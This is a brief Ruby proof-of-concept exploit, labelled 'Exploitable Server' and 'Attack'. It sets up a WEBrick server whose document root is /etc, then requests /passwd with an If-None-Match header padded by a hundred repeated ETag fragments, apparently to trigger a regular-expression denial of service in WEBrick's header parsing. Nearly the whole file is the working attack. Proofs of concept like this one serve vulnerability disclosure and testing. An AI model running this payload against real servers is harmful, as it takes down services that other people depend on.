#-- Exploitable Server --
# require 'webrick'
# WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

#-- Attack --
require 'net/http'
res = Net::HTTP.start("localhost", 2000) { |http|
  req = Net::HTTP::Get.new("/passwd")
  req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
  http.request(req)
}
p res
